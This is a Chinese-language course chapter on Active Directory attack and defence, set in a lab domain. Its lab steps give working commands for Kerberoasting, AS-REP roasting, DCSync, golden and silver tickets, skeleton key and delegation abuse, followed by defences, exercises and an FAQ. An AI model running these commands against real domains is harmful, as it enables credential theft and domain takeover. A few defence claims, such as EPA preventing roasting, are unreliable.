# 第14章：Active Directory 攻防

> **难度**：⭐⭐⭐⭐ (中高级)  
> **预计时间**：90-120分钟  
> **课程编号**：14

---

## 📋 学习目标

完成本章学习后，你将能够：

1. **理解Active Directory核心架构**：掌握域、组织单位(OU)、域控制器(DC)、LDAP协议和Kerberos认证原理
2. **执行域枚举**：使用PowerView、BloodHound和LDAP查询收集域环境信息
3. **实施Kerberos攻击**：掌握AS-REP Roasting、Kerberoasting、Golden Ticket和Silver Ticket攻击方法
4. **执行高级攻击**：理解并实施DCSync/DCShadow攻击
5. **利用委派攻击**：掌握非约束委派、约束委派和基于资源的约束委派攻击
6. **攻击林信任关系**：理解并攻击跨域和父子域信任
7. **部署防御措施**：了解并实施EPA、托管服务账户、LAPS和Credential Guard等防护措施
8. **完成实战演练**：通过完整攻击链案例，从普通域用户提升至域控制器权限

---

## 📚 背景知识

### 1. Active Directory 概述

Active Directory（AD）是微软开发的企业级目录服务，广泛应用于Windows域网络环境中。它提供了集中式的身份验证、授权和资源管理服务，是现代企业IT基础设施的核心组件。据不完全统计，全球超过90%的财富500强企业使用Active Directory作为其身份管理解决方案。

#### 1.1 什么是Active Directory

Active Directory是一种分层结构的目录服务，它存储了网络上所有对象的信息，并使管理员和用户可以轻松地查找和使用这些信息。AD使用结构化数据存储作为目录的逻辑层次结构基础，包括：

- **目录信息**：有关网络上对象的信息
- **层次结构**：一些对象包含在另一些对象中
- **安全服务**：身份验证和授权
- **管理工具**：用于管理网络的管理工具

在Active Directory环境中，所有计算机、用户、组和其他资源都被表示为对象，这些对象具有属性，并且可以根据组织结构进行组织和管理。

#### 1.2 Active Directory 的核心组件

**域（Domain）**
域是Active Directory的核心管理单元，它定义了安全边界。在同一个域中的对象共享一个公共的目录数据库，并且由同一个域控制器（DC）集合进行管理。域中的所有用户账户都由该域的域控制器进行身份验证。

域的主要特点包括：
- 共享相同的目录数据库
- 统一的安全策略和设置
- 集中式管理和权限分配
- 使用DNS进行域名解析

**组织单位（Organizational Unit, OU）**
OU是Active Directory中的容器对象，用于组织域中的其他对象。OU可以包含用户、组、计算机和其他OU（嵌套OU）。OU主要用于：

- **委派管理权限**：管理员可以将特定OU的管理权限委派给其他用户或组
- **应用组策略（GPO）**：组策略可以链接到OU，影响OU中的所有对象
- **组织结构映射**：OU通常反映企业的组织结构或管理需求

OU与组的区别：
- OU用于组织和管理对象
- 组用于授予权限和访问控制
- 一个用户只能属于一个OU（在层次结构中的位置），但可以属于多个组

**域控制器（Domain Controller, DC）**
域控制器是运行Active Directory域服务（AD DS）的Windows服务器。DC负责：

- **身份验证**：处理用户的登录请求和身份验
- **目录服务**：提供对目录数据的读写访问
- **策略执行**：应用和执行组策略
- **复制**：在多个域控制器之间同步目录数据

在多域控制器环境中，所有域控制器通常都是对等的（除了操作主机角色），以实现冗余和负载均衡。

**全局编录（Global Catalog, GC）**
全局编录是存储在整个林中所有对象的部分副本的目录。它包含：
- 林中每个域的所有对象的常用属性
- 其主机域的所有对象的全部属性

全局编录的主要作用：
- 跨域对象搜索
- 用户登录时的通用组成员身份解析
- 提供地址簿信息查询

**林（Forest）**
林是一个或多个域的集合，它们共享：
- 相同的架构（Schema）
- 相同的配置
- 相同的全局编录
- 隐式的双向可传递信任关系

林是Active Directory的安全边界，定义了目录数据的边界。

**域树（Domain Tree）**
域树是共享连续命名空间的域层次结构。例如，如果一个域为example.com，其子域可以是corp.example.com和dev.example.com。

### 2. LDAP协议详解

**轻量级目录访问协议（Lightweight Directory Access Protocol, LDAP）**是用于访问和维护分布式目录信息服务（如Active Directory）的协议。

#### 2.1 LDAP 基本概念

**目录结构**
LDAP目录以树状结构组织，称为目录信息树（DIT）。条目的唯一标识是区别名（Distinguished Name, DN）。

**重要概念**：
- **DN（Distinguished Name）**：条目的唯一标识，例如：`CN=John Doe,OU=Users,DC=example,DC=com`
- **RDN（Relative Distinguished Name）**：DN的一部分，例如：`CN=John Doe`
- **Base DN**：搜索的起始点，例如：`DC=example,DC=com`
- **Filter**：搜索过滤器，使用LDAP过滤器语法，例如：`(objectClass=user)`
- **Scope**：搜索范围（base、one、sub）

**LDAP 操作**：
- **Bind**：认证绑定
- **Search**：搜索目录
- **Add**：添加条目
- **Modify**：修改条目
- **Delete**：删除条目
- **Modify DN**：重命名或移动条目

#### 2.2 LDAP 在Active Directory中的应用

Active Directory通过LDAP协议提供对目录数据的访问。常用的LDAP查询工具包括：
- ldapsearch（命令行工具）
- PowerView（PowerShell框架）
- ADSI（Active Directory Services Interface）
- .NET System.DirectoryServices命名空间

**LDAP 过滤器语法**：
- `=`：等于，例如：`(cn=John)`
- `*`：通配符，例如：`(cn=J*)`
- `&`：逻辑与，例如：`(&(objectClass=user)(cn=J*))`
- `|`：逻辑或，例如：`(|(cn=John)(cn=Jane))`
- `!`：逻辑非，例如：`(!(cn=John))`

### 3. Kerberos 协议原理

**Kerberos**是Active Directory使用的默认身份验证协议，由MIT开发，名称来源于希腊神话中的三头犬。

#### 3.1 Kerberos 组件

- **KDC（Key Distribution Center）**：密钥分发中心，通常运行在域控制器上
  - **AS（Authentication Service）**：身份验证服务
  - **TGS（Ticket-Granting Service）**：票据授予服务
- **TGT（Ticket-Granting Ticket）**：票据授予票据
- **Session Key**：会话密钥
- **Principal**：主体（用户或服务）
- **Realm**：域（在Kerberos中）

#### 3.2 Kerberos 认证流程

**阶段1：AS交换（获取TGT）**
1. 客户端向KDC的AS服务发送AS_REQ（包含用户名、时间戳等）
2. AS验证用户身份（通常检查密码派生密钥能否解密请求）
3. AS返回AS_REP，包含：
   - TGT（使用KRBTGT账户密钥加密）
   - Session Key（使用用户密码派生密钥加密）

**阶段2：TGS交换（获取服务票据）**
1. 客户端使用TGT向KDC的TGS服务发送TGS_REQ
2. TGS验证TGT和请求
3. TGS返回TGS_REP，包含：
   - 服务票据（使用服务账户密钥加密）
   - 新的Session Key

**阶段3：AP交换（访问服务）**
1. 客户端将服务票据发送给目标服务
2. 服务使用自己的密钥解密票据，验证客户端身份
3. 建立安全上下文

#### 3.3 Kerberos 攻击面

Kerberos协议的多个环节都存在被攻击的可能：
- **AS环节**：AS-REP Roasting（不需要预认证的用户）
- **TGS环节**：Kerberoasting（破解服务票据）
- **密钥材料**：Golden Ticket（KRBTGT密钥）、Silver Ticket（服务账户密钥）
- ** delegation**：委派攻击

### 4. Active Directory 攻击概述

Active Directory攻击是红队演练和渗透测试中的重要组成部分。攻击者通常以获得域管理员权限为目标，因为这将赋予其对整个域环境的完全控制。

**典型的AD攻击阶段**：
1. **初始访问**：通过钓鱼、漏洞利用等方式获得初始立足点
2. **域内枚举**：收集域环境信息，识别攻击路径
3. **权限提升**：利用AD中的配置错误和漏洞提升权限
4. **横向移动**：在域内移动，访问更多资源
5. **持久化**：建立持久访问机制
6. **域控攻击**：最终目标通常是攻破域控制器

**常用工具**：
- PowerView / Powerview.py
- BloodHound / SharpHound
- Mimikatz
- Impacket工具套件
- Rubeus
- Covenant / Cobalt Strike

---

## 🧪 实验环境

### 实验环境拓扑

```
┌─────────────────────────────────────────────────────┐
│                   Windows Server 2019                │
│              (域控制器 DC01)                         │
│         - AD DS 角色                                 │
│         - DNS 服务器                                 │
│         - 林根域：hackme.local                       │
└─────────────────────────────────────────────────────┘
                      │
        ┌─────────────┼─────────────┐
        │             │             │
┌───────┴──────┐ ┌───┴─────┐ ┌────┴──────┐
│ Windows 10   │ │ Server  │ │  Kali OS  │
│ (工作站)     │ │  2019   │ │(攻击机)   │
│ 域用户登录   │ │ 成员服务器│ │           │
└──────────────┘ └─────────┘ └───────────┘
```

### 环境要求

**硬件要求**：
- 主机：16GB+ RAM，100GB+ 磁盘空间
- 可以使用虚拟机或云环境

**软件要求**：
- 虚拟机平台：VMware Workstation / VirtualBox / Hyper-V
- Windows Server 2019 ISO（用于域控制器）
- Windows 10 ISO（用于域内工作站）
- Kali Linux ISO（攻击机器）

**预配置**：
1. 安装Windows Server 2019，配置为域控制器（hackme.local）
2. 创建多个OU、用户、组、计算机账户
3. 配置一些易受攻击的服务和设置（用于演示攻击）
4. 安装Kali Linux，配置网络使其能访问域网络

### 实验环境准备清单

**域控制器配置**：
- [ ] 安装AD DS角色
- [ ] 创建域：hackme.local
- [ ] 创建以下OU结构：
  - OU=Users
  - OU=Computers
  - OU=Servers
  - OU=Service Accounts
- [ ] 创建测试用户（至少5个）
- [ ] 创建管理服务账户（用于Kerberoasting演示）
- [ ] 配置至少一台服务器具有非约束委派

**攻击机器配置**：
- [ ] 安装Kali Linux
- [ ] 安装Impacket工具套件
- [ ] 安装BloodHound和SharpHound
- [ ] 安装Rubeus（如果需要Windows攻击机）

---

## 🔬 实验步骤

### 实验1：域枚举

域枚举是AD攻击的第一步，目标是收集有关域环境的信息，识别潜在的攻击向量。

#### 1.1 使用PowerView进行枚举

PowerView是PowerSploit框架的一部分，提供了丰富的Active Directory枚举功能。

**基础枚举**：
```powershell
# 导入PowerView
Import-Module .\PowerView.ps1

# 获取当前域信息
Get-NetDomain

# 获取域控制器
Get-NetDomainController

# 获取域策略
Get-DomainPolicy

# 获取用户信息
Get-NetUser | select samaccountname,description,lastlogon
Get-NetUser -UserName "admin"

# 获取组信息
Get-NetGroup | select samaccountname,description
Get-NetGroupMember -GroupName "Domain Admins"

# 获取计算机信息
Get-NetComputer -FullData
```

**高级枚举**：
```powershell
# 查找具有SPN的账户（Kerberoasting目标）
Get-NetUser -SPN

# 查找不需要预认证的用户（AS-REP Roasting目标）
Get-DomainUser -PreauthNotRequired

# 查找具有委派设置的账户
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# 查找有趣的文件服务器
Get-NetFileServer

# 枚举GPO
Get-DomainGPO
Get-DomainGPOLocalGroup
```

#### 1.2 使用BloodHound进行枚举

BloodHound使用图数据库来分析AD中的关系和攻击路径。

**收集数据**：
```powershell
# 使用SharpHound收集数据
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain hackme.local

# 或使用Python版本的BloodHound
bloodhound-python -d hackme.local -u username -p password -c All
```

**分析数据**：
1. 启动BloodHound：`./bloodhound`
2. 登录（默认：neo4j/neo4j）
3. 导入收集的数据（.zip文件）
4. 使用预定义查询或自定义Cypher查询分析

**重要查询**：
- 找到从域用户到域管理员的最短路径
- 找到具有DCSync权限的主体
- 找到具有高价值会话的计算机
- 找到可以委派攻击的路径

#### 1.3 使用LDAP查询

**使用ldapsearch**：
```bash
# 基础查询
ldapsearch -x -H ldap://DC01.hackme.local -D "hackme.local\user" -W -b "DC=hackme,DC=local" "(objectClass=user)"

# 查找所有用户
ldapsearch -x -H ldap://DC01.hackme.local -D "hackme.local\user" -W -b "DC=hackme,DC=local" "(objectClass=user)" sAMAccountName

# 查找域管理员
ldapsearch -x -H ldap://DC01.hackme.local -D "hackme.local\user" -W -b "DC=hackme,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=hackme,DC=local)"
```

### 实验2：Kerberos攻击

#### 2.1 AS-REP Roasting

AS-REP Roasting攻击针对的是不需要预认证（DONT_REQ_PREAUTH）的用户账户。

**攻击步骤**：
```bash
# 使用Impacket的GetNPUsers.py
python3 GetNPUsers.py hackme.local/ -usersfile users.txt -format john -outputfile hashes.txt

# 或使用Rubeus（在Windows上）
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# 破解哈希
hashcat -m 18200 hashes.txt wordlist.txt
```

**防御措施**：
- 确保所有用户都需要预认证（默认设置）
- 使用强密码策略
- 监控事件ID 4768（Kerberos票据请求）

#### 2.2 Kerberoasting

Kerberoasting攻击针对的是具有SPN（Service Principal Name）的账户，通过请求其服务票据并尝试离线破解。

**攻击步骤**：
```bash
# 使用Impacket的GetUserSPNs.py
python3 GetUserSPNs.py hackme.local/user:password -dc-ip 192.168.1.10 -request

# 或使用Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# 破解哈希（RC4加密的票据）
hashcat -m 13100 hashes.txt wordlist.txt

# 如果是AES加密的票据（更困难）
hashcat -m 19600 hashes.txt wordlist.txt
```

**防御措施**：
- 使用复杂的服务账户密码（25+字符）
- 使用托管服务账户（MSA/gMSA）
- 定期轮换服务账户密码
- 启用AES加密（不使用RC4）

#### 2.3 Golden Ticket攻击

Golden Ticket是使用KRBTGT账户密钥创建的伪造TGT，可以用于获取任意用户的身份。

**攻击步骤**：
```bash
# 首先需要获得KRBTGT账户的NTLM哈希（需要域管理员权限）
# 使用Mimikatz
mimikatz # lsadump::dcsync /domain:hackme.local /user:krbtgt

# 创建Golden Ticket
mimikatz # kerberos::golden /user:administrator /domain:hackme.local /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> /id:500

# 使用Golden Ticket
mimikatz # kerberos::ptt ticket.kirbi

# 验证访问
dir \\DC01.hackme.local\C$
```

**防御措施**：
- 定期重置KRBTGT账户密码（两次，间隔10+小时）
- 实施Credential Guard
- 监控异常的Kerberos票据请求

#### 2.4 Silver Ticket攻击

Silver Ticket是针对特定服务的伪造服务票据。

**攻击步骤**：
```bash
# 创建针对CIFS服务的Silver Ticket
mimikatz # kerberos::golden /user:admin /domain:hackme.local /sid:S-1-5-21-... /target:DC01.hackme.local /service:CIFS /rc4:<computer_account_hash>

# 使用Silver Ticket
mimikatz # kerberos::ptt ticket.kirbi
```

**防御措施**：
- 启用服务票据的PAC验证
- 实施Credential Guard
- 监控事件ID 4769

### 实验3：DCSync和DCShadow攻击

#### 3.1 DCSync攻击

DCSync模拟域控制器之间的复制过程，从其他域控制器请求目录数据。

**攻击步骤**：
```bash
# 使用Impacket的secretsdump.py
python3 secretsdump.py hackme.local/user:password@DC01.hackme.local -dc-ip 192.168.1.10

# 使用Mimikatz
mimikatz # lsadump::dcsync /domain:hackme.local /user:krbtgt

# 导出所有用户哈希
mimikatz # lsadump::dcsync /domain:hackme.local /all
```

**需要具备的权限**：
- Replicating Directory Changes (DS-REPLICATION-GET-CHANGES)
- Replicating Directory Changes All (DS-REPLICATION-GET-CHANGES-ALL)
- Replicating Directory Changes in Filtered Set（可选）

**防御措施**：
- 限制具有DCSync权限的账户
- 使用AdminSDHolder保护特权账户
- 启用高级审计策略，监控目录服务访问

#### 3.2 DCShadow攻击

DCShadow通过注册伪装的域控制器来执行DCSync攻击。

**攻击步骤**：
```bash
# 使用Mimikatz
# 在伪装DC上
mimikatz # lsadump::dcshadow /object:USER01 /attribute:description /value:"Hacked"

# 在另一终端推送更改
mimikatz # lsadump::dcshadow /push
```

**防御措施**：
- 实施严格的域控制器认证
- 监控域控制器注册事件
- 使用Windows Server 2016+的受保护用户组

### 实验4：委派攻击

#### 4.1 非约束委派（Unconstrained Delegation）

具有非约束委派的计算机可以代表用户访问任何服务。

**攻击步骤**：
```bash
# 查找具有非约束委派的计算机
Get-DomainComputer -Unconstrained

# 攻击方法：等待具有高权限的用户访问该计算机
# 然后导出用户的TGT
mimikatz # sekurlsa::tickets /export

# 使用被盗的TGT
mimikatz # kerberos::ptt [0;2bf76]-2-0-60a00000-USER@krbtgt-hackme.local.kirbi
```

**防御措施**：
- 避免使用非约束委派
- 使用约束委派或基于资源的约束委派
- 保护具有高权限账户的工作站

#### 4.2 约束委派（Constrained Delegation）

约束委派限制了可以委派到的服务。

**攻击步骤**：
```bash
# 查找具有约束委派的账户
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth

# 使用Impacket的getST.py请求服务票据
python3 getST.py -spn cifs/DC01.hackme.local hackme.local/user:password

# 使用服务票据
export KRB5CCNAME=/root/user.ccache
python3 psexec.py -k -no-pass DC01.hackme.local
```

**防御措施**：
- 使用基于资源的约束委派替代
- 限制可以配置委派的账户
- 启用约束委派的协议转换审计

#### 4.3 基于资源的约束委派（Resource-Based Constrained Delegation, RBCD）

RBCD允许资源所有者控制谁可以委派给它。

**攻击步骤**：
```bash
# 如果攻击者可以控制计算机账户或具有写权限的账户
# 可以修改目标计算机的msDS-AllowedToActOnBehalfOfOtherIdentity属性

# 使用Powermad创建计算机账户
New-MachineAccount -MachineAccount ATTACKER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 获取计算机账户的SID
Get-DomainComputer ATTACKER$

# 修改目标计算机的RBCD设置
$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-SIDsidofATTACKER)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject DC01$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# 使用Rubeus请求票据
Rubeus.exe s4u /user:ATTACKER$ /password:Password123! /impersonateuser:administrator /msdsspn:cifs/DC01.hackme.local /ptt
```

**防御措施**：
- 限制谁可以创建计算机账户（默认10个）
- 监控msDS-AllowedToActOnBehalfOfOtherIdentity属性的修改
- 使用Managed Service Accounts

### 实验5：林信任攻击

#### 5.1 信任关系枚举

```powershell
# 枚举域信任
Get-DomainTrust
Get-DomainTrustMapping

# 枚举森林
Get-Forest
Get-ForestDomain
Get-ForestGlobalCatalog
```

#### 5.2 跨域攻击

如果域之间存在信任关系，攻击者可以从一个域攻击另一个域。

**攻击向量**：
- 从子域攻击父域（默认信任是可传递的）
- 利用信任密钥创建信任票据
- 利用错误的信任配置

**防御措施**：
- 使用选择性身份验证的信任
- 启用SID过滤（默认启用）
- 定期审查信任关系

---

## 💡 解题技巧

### 1. 高效枚举技巧

**使用BloodHound快速识别攻击路径**：
- 优先查看"Shortest Paths to Domain Admins from owned principals"
- 查找"Nodes with most local admin rights"
- 分析"GPOs that can modify sensitive groups"

**PowerView高级技巧**：
```powershell
# 查找有趣的ACL
Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.SecurityIdentifier -match "S-1-5-21-"}

# 查找可以重置密码的用户
Get-DomainUser | Get-DomainObjectAcl | ? {$_.ObjectType -eq "bf967a86-0de6-11d0-a285-00aa003049e2"}

# 查找有趣的GPO权限
Get-DomainGPO | Get-DomainObjectAcl | ? {$_.SecurityIdentifier -match "S-1-5-21-"}
```

### 2. 权限提升技巧

**利用ACL错误配置**：
- GenericAll：完全控制
- WriteDacl：修改权限
- WriteOwner：修改所有者
- Self：添加自身到组

**利用GPO**：
- 查找链接到高权限OU的GPO
- 检查GPO权限
- 利用GPO部署恶意软件或脚本

**利用LAPS**：
- 如果具有读取LAPS密码的权限
- 使用PowerView读取LAPS密码

### 3. 横向移动技巧

**Pass the Hash**：
```bash
# 使用Impacket
python3 psexec.py -hashes :ntlmhash user@target

# 使用CrackMapExec
cme smb 192.168.1.0/24 -u user -H ntlmhash --local-auth
```

**Pass the Ticket**：
```bash
# 导出票据
mimikatz # sekurlsa::tickets /export

# 注入票据
mimikatz # kerberos::ptt ticket.kirbi
```

**Overpass the Hash**：
```bash
# 使用哈希请求TGT
python3 getTGT.py hackme.local/user -hashes :ntlmhash
```

### 4. 持久化技巧

**Golden Ticket**：
- 最可靠的持久化方法
- 需要KRBTGT哈希
- 每180天（默认）重置KRBTGT密码

**Skeleton Key**：
```bash
# 在域控制器上注入Skeleton Key
mimikatz # misc::skeleton

# 使用主密码登录
net use \\DC01\C$ /user:administrator "mimikatz"
```

**AdminSDHolder**：
- 修改AdminSDHolder的ACL
- 定期被SDProp进程覆盖（默认每小时）

**组策略持久化**：
- 修改GPO
- 添加启动脚本或计划任务

---

## 🛡️ 防御措施

### 1. 身份认证保护

**启用Kerberos AES加密**：
- 禁用RC4加密
- 强制使用AES256

**实施Kerberos Armoring（EPA）**：
- 启用EPA（Extended Protection for Authentication）
- 防止Kerberoasting和AS-REP Roasting

**启用Credential Guard**：
- 保护凭据不被提取
- 需要Windows 10 Enterprise+和UEFI/Secure Boot

**使用受保护用户组（Protected Users）**：
- 防止使用NTLM认证
- 防止Kerberos预认证使用DES或RC4
- 防止账户被委派

### 2. 账户安全

**使用托管服务账户（MSA/gMSA）**：
- 自动密码管理
- 自动密码轮换
- 复杂的密码（120字符）

**实施LAPS（Local Admin Password Solution）**：
- 每台计算机具有唯一的本地管理员密码
- 密码存储在AD中，具有ACL保护
- 自动密码轮换

**强密码策略**：
- 最小密码长度：14+字符
- 密码复杂性要求
- 定期密码更改

**禁用不需要的账户**：
- 定期审查禁用不需要的账户
- 特别是服务账户

### 3. 权限访问控制

**实施最小权限原则**：
- 用户只应具有完成工作所需的最小权限
- 定期审查权限

**使用AdminSDHolder保护特权账户**：
- 防止意外修改特权账户
- 定期审查AdminSDHolder ACL

**启用高级审计策略**：
- 目录服务访问
- 账户登录事件
- 对象访问

**定期使用BloodHound分析AD**：
- 识别攻击路径
- 修复ACL错误配置

### 4. 系统加固

**及时打补丁**：
- 特别是域控制器
- 关注AD相关的CVE

**禁用非约束委派**：
- 使用约束委派或RBCD替代

**启用PowerShell日志记录**：
- 模块日志记录
- 脚本块日志记录
- 转录日志记录

**使用Windows Defender Credential Guard**：
- 防止凭据盗窃

**实施网络分段**：
- 隔离域控制器
- 限制对域控制器的访问

### 5. 监控和检测

**监控关键事件ID**：
- 4768：Kerberos TGT请求
- 4769：Kerberos服务票据请求
- 4776：NTLM认证
- 4624：账户登录
- 4672：特权使用

**使用SIEM聚合日志**：
- 关联多个事件
- 检测异常模式

**实施蜜罐账户**：
- 创建看起来有趣的账户
- 监控对这些账户的使用

**定期红队演练**：
- 测试防御措施的有效性
- 识别新的攻击向量

---

## 📝 课后练习

### 练习1：域枚举挑战

**目标**：收集目标域hackme.local的完整信息

**任务**：
1. 使用PowerView枚举所有域用户、组、计算机
2. 识别所有具有SPN的账户
3. 识别所有不需要预认证的用户
4. 使用BloodHound分析域中的攻击路径
5. 识别可以提升到域管理员权限的路径

**提交**：截图和书面报告

### 练习2：Kerberoasting攻击

**目标**：通过Kerberoasting获得域管理员权限

**任务**：
1. 识别具有SPN的账户
2. 请求服务票据
3. 离线破解票据
4. 使用破解的凭据登录
5. 提升到域管理员权限

**提交**：详细步骤和截图

### 练习3：委派攻击

**目标**：利用委派攻击从普通用户提升到域管理员

**任务**：
1. 识别具有非约束委派或约束委派的账户
2. 实施相应的攻击
3. 获取域管理员权限

**提交**：攻击脚本和详细步骤

### 练习4：防御措施实施

**目标**：在实验环境中实施防御措施

**任务**：
1. 部署LAPS
2. 配置MSA/gMSA
3. 启用Credential Guard
4. 配置高级审计策略
5. 测试防御措施的有效性

**提交**：配置文档和测试结果

### 练习5：综合挑战

**目标**：从初始访问到域管理员权限的完整攻击链

**场景**：
你获得了目标组织的一台工作站的访问权限，该工作站已加入域hackme.local。你的目标是获得域管理员权限。

**任务**：
1. 在域内枚举
2. 识别并利用错误配置
3. 提升权限
4. 横向移动到域控制器
5. 获得域管理员权限
6. 建立持久化

**提交**：完整的渗透测试报告

---

## ❓ FAQ

### Q1：什么是Active Directory？为什么它是攻击目标？

**A**：Active Directory是微软的企业目录服务，管理着网络中的用户、计算机和其他资源。它是攻击目标，因为：
- 它集中管理整个域的身份验证和授权
- 攻破AD通常意味着获得整个网络的控制权
- 许多组织错误配置AD，导致容易被攻击

### Q2：Kerberos认证相比NTLM有哪些优势？

**A**：
- 相互认证（服务器也认证客户端）
- 不需要传输密码（基于票据）
- 支持委派
- 更安全（使用时间戳防止重放攻击）

### Q3：如何防御Kerberoasting攻击？

**A**：
- 使用长的复杂密码（25+字符）用于服务账户
- 使用托管服务账户（MSA/gMSA）
- 定期轮换服务账户密码
- 启用AES加密，禁用RC4
- 监控事件ID 4769

### Q4：Golden Ticket和Silver Ticket有什么区别？

**A**：
- **Golden Ticket**：伪造的TGT，使用KRBTGT密钥，可以用于获取任意服务票据
- **Silver Ticket**：伪造的服务票据，使用服务账户密钥，只能访问特定服务
- Golden Ticket更强大，但Silver Ticket更隐蔽

### Q5：如何检测DCSync攻击？

**A**：
- 监控事件ID 4662（目录服务访问）
- 查找具有Replicating Directory Changes权限的使用
- 使用SIEM关联多个域控制器的日志
- 实施Microsoft ATA或Azure ATP

### Q6：什么是LAPS？如何部署？

**A**：
- LAPS（Local Admin Password Solution）为每台域计算机生成唯一的本地管理员密码
- 密码存储在AD中，具有ACL保护
- 部署步骤：
  1. 安装LAPS MSI
  2. 更新AD架构
  3. 配置密码策略
  4. 配置ACL
  5. 部署GPO

### Q7：BloodHound是如何工作的？

**A**：
- 使用图数据库（Neo4j）存储AD数据
- 数据包括：用户、组、计算机、OU、GPO、ACL等
- 使用Cypher查询语言分析关系
- 可以识别攻击路径和错误配置

### Q8：如何保护域控制器？

**A**：
- 及时打补丁
- 限制物理和网络安全访问
- 启用Credential Guard和Windows Defender
- 使用Just Enough Administration (JEA)
- 实施域控制器加固指南
- 监控和审计

### Q9：什么是托管服务账户（MSA/gMSA）？

**A**：
- MSA：独立托管服务账户
- gMSA：组托管服务账户
- 特点：
  - 自动密码管理
  - 自动密码轮换
  - 复杂的密码（120字符）
  - 不需要手动管理密码

### Q10：如何防御委派攻击？

**A**：
- 避免使用非约束委派
- 使用基于资源的约束委派（RBCD）
- 限制可以配置委派的账户
- 保护具有高权限账户的工作站
- 监控委派相关的事件

---

## 📊 总结

### 关键知识点回顾

1. **Active Directory基础**：
   - 域、OU、DC、林、域树的概念
   - LDAP协议和查询
   - Kerberos认证流程

2. **攻击技术**：
   - 域枚举：PowerView、BloodHound、LDAP
   - Kerberos攻击：AS-REP Roasting、Kerberoasting、Golden/Silver Ticket
   - DCSync/DCShadow
   - 委派攻击：非约束、约束、RBCD
   - 林信任攻击

3. **防御措施**：
   - EPA、MSA/gMSA、LAPS、Credential Guard
   - 强密码策略
   - 最小权限原则
   - 高级审计和监控

### 最佳实践建议

**对于防御者**：
1. 定期使用BloodHound分析AD，识别攻击路径
2. 实施LAPS和MSA/gMSA
3. 启用Credential Guard和EPA
4. 及时打补丁，特别是域控制器
5. 实施强密码策略和MFA
6. 启用详细的日志记录和监控
7. 定期进行红队演练

**对于攻击者（道德黑客）**：
1. 枚举是一切的基础，花时间做好枚举
2. 理解Kerberos协议原理，有助于理解攻击
3. 使用BloodHound识别最短攻击路径
4. 不要忽视ACL错误配置
5. 持久化很重要，但也要考虑隐蔽性

### 进一步学习资源

**官方文档**：
- Microsoft Active Directory Documentation
- Kerberos Protocol Specification (RFC 4120)

**工具**：
- PowerView：https://github.com/PowerShellMafia/PowerSploit
- BloodHound：https://github.com/BloodHoundAD/BloodHound
- Impacket：https://github.com/SecureAuthCorp/impacket
- Mimikatz：https://github.com/gentilkiwi/mimikatz

**学习资源**：
- ADSecurity.org
- Harmj0y的博客
- SpecterOps的AD攻击系列
- SANS SEC564：Active Directory安全

**认证**：
- OSCP（Offensive Security Certified Professional）
- CRTP（Certified Red Team Professional）
- CRTE（Certified Red Team Expert）

### 结语

Active Directory攻防是一个复杂而深入的领域，本章仅涵盖了基础知识和主要攻击技术。在实际的红队演练和渗透测试中，还需要结合具体的环境和情况，灵活运用各种技术和工具。

重要的是要理解原理而不仅仅是工具的使用。只有理解了Kerberos协议、LDAP、ACL等基础知识，才能在面对不同的AD环境时，识别出潜在的攻击向量。

同时，防御也是本章的重点。安全是一个持续的过程，需要定期的评估、加固和监控。通过实施本章介绍的防御措施，可以显著提高Active Directory环境的安全性。

---

## 参考资源

1. **官方文档**：
   - [Microsoft Active Directory 文档](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/)
   - [Kerberos RFC 4120](https://tools.ietf.org/html/rfc4120)

2. **工具和资源**：
   - [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
   - [BloodHound](https://github.com/BloodHoundAD/BloodHound)
   - [Impacket](https://github.com/SecureAuthCorp/impacket)
   - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

3. **学习资源**：
   - [ADSecurity.org](https://adsecurity.org/)
   - [Harmj0y's Blog](https://blog.harmj0y.net/)
   - [SpecterOps Blog](https://posts.specterops.io/)

4. **相关课程**：
   - SANS SEC564：Active Directory Security
   - Pentester Academy：Active Directory Attacks
   - Attacking and Defending Active Directory (ADLab)

---

> **注意**：本章内容仅用于教育和道德黑客目的。在未授权的系统上实施这些技术是非法的。始终确保你有适当的授权和许可。
